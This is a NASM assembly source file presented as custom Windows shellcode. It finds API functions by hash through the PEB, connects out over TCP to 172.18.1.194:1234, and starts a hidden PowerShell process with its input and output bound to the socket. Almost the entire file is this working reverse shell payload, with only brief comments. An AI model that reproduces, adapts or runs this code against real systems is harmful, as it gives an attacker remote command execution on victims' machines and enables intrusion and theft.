; This is custom shellcode that creates a PowerShell process which connects back to the specified IP/port.  It can be compiled with NASM.

[BITS 32]

mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction

mov ebp, esp
sub esp, 250h

; Find kernel32.dll
push edx
mov ebx, 0x4b1ffe8e ; module hash
call get_module_address
pop edx

; Build kernel32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call LoadLibaryA to get ws2_32.dll into memory
push ebp
push edx
lea eax, [EDX + WS232]
push eax
call [EDX + LoadLibraryA]
pop edx
pop ebp

; Build ws2_32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + WS232HASHTABLE]
lea edi, [EDX + WS232FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call WSAStartup
xor ebx, ebx ; zero out EBX for WSAData
mov bx, 0x190  ; size of WSAData
sub esp, ebx  ; allocate space for WSAData
push esp  ; push pointer to WSAData to the stack
xor ebx, ebx  ; zero out EBX for wVersionRequired
mov bx, 0x202  ; use version 2.2 for wVersionRequired
push ebx  ; push wVersionRequired to stack
mov ebx, edx ; store EDX value for later
call dword [EDX + WSAStartup]  ; call WSAStartup(MAKEWORD(2,2), &WSAData)

; Call WSASocketA
xchg edx, ebx ; load original EDX value
xor ebx, ebx  ; zero out EBX for dwFlags, g, and lpProtocolInfo
push ebx  ; set dwFlags to null 
push ebx  ; set g to 0
push ebx  ; set lpProtocolInfo to null
add bx, 0x6  ; set protocol to 0x6 (TCP)
push ebx ;  push protocol to stack
sub bx, 0x5  ; set type to 1 (SOCK_STREAM)
push ebx ; push type to stack
inc ebx ;  set af to 2 (IPV4)
push ebx ; push af to stack
mov ebx, edx ; store EDX value for later
call dword [EDX + WSASocketA]  ; call WSASocketA(0x2,0x1,0x6,null,0x0,null)
xchg ecx, eax ; store socket descriptor in ECX for connect

; Call connect
xchg edx, ebx ; load original EDX value
push 0xc20112ac ; local ip address 172.18.1.194
push word 0xd204 ; port 1234
xor ebx, ebx ; zero out EBX for protocol
add bx, 0x2 ; specifies TCP protocol
push word bx ; push TCP to stack
mov edi, esp ; store pointer sockaddr structure (172.18.1.194,1234,2) in edi
push byte 0x10 ; namelen variable = size of sockaddr
push edi ; push sockaddr to stack 
push ecx ; push socket descriptor to stack
mov ebx, edx ; store EDX value for later
call dword [EDX + Connect]  ; call connect

; setup CreateProcessA
xchg edx, ebx ; load original EDX value
; push powershell with two spaces to the stack.
push 0x20206c6c ; <space><space>ll
push 0x65687372 ; ehsr
push 0x65776f70 ; ewop
mov edi, esp ; save pointer to powershell string in edi
sub esp, 0x10 ; pointer to lpProcessInformation
mov esi, esp ; store lpProcessInformation pointer in esi

; StartupInfoA data structure
push ecx ; hStdError = socket
push ecx ; hStdOutput = socket
push ecx ; hStdInput = socket
xor ebx, ebx ; zero ebx for next variables
push ebx ; lpReserved2 = null 
push ebx ; cbReserved2 = null
inc ebx ; increment ebx to set up rotate left 
rol ebx, 0x8 ; set ebx to 0x100 
push ebx ; dwFlags = 0x100 (STARTF_USESTDHANDLES)
xor ebx, ebx ; zero ebx for next variables
push ebx ; dwFillAttribute = null
push ebx ; dwYCountChars = null
push ebx ; dwXCountChars = null
push ebx ; dwYSize = null
push ebx ; dwXSize = null
push ebx ; dwY = null
push ebx ; dwX = null
push ebx ; lpTitle = null
push ebx ; lpDesktop = null 
push ebx ; lpReserved = null
add bl, 0x44 ; cb = 0x44 (size of structure)
push ebx ; esp now pointing at StartupInfoA

; call CreateProcessA
mov eax, esp ; store esp in eax
push esi ; pointer to lpProcessInformation
push eax ; pointer to StartupInfoA
xor ebx, ebx ; zero ebx for next variables
push ebx ; lpCurrentDirectory = null
push ebx ; lpEnvironment = null
add ebx, 0x8 ; add 8 to ebx to prepare for bit shift 
rol ebx, 0x18 ; set ebx to 0x08000000
push ebx ; dwCreationFlags = 0x08000000 (CREATE_NO_WINDOW)
xor ebx, ebx ; zero out ebx
inc ebx ; increase ebx for next variable
push ebx ; bInheritHandles = 1 (true)
dec ebx ; decrease ebx back to 0
push ebx ; lpThreadAtrributes = 0
push ebx ; lpProcessAttributes = 0
push edi ; lpCommandLine = "powershell"
push ebx ; lpApplicationName = null
call [edx + CreateProcessA] ; call CreateProcessA to launch powershell with stdin, stdout, and stderr connected to socket


; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]
; xor ecx, ecx

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0x46318ac7; CreateProcessA
	dd 0xc8ac8026; LoadLibraryA
	dd 0xFFFF 

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000001
LoadLibraryA:
	dd 0x00000002

WS232HASHTABLE:
	dd 0xeefa3514 ; WSASocketA
	dd 0xcdde757d ; WSAStartup
	dd 0xedd8fe8a ; connect
	dd 0xFFFF

WS232FUNCTIONSTABLE:
WSASocketA:
	dd 0x00000003
WSAStartup:
	dd 0x00000004
Connect:
	dd 0x00000005

WS232:
	db "ws2_32.dll",0x00
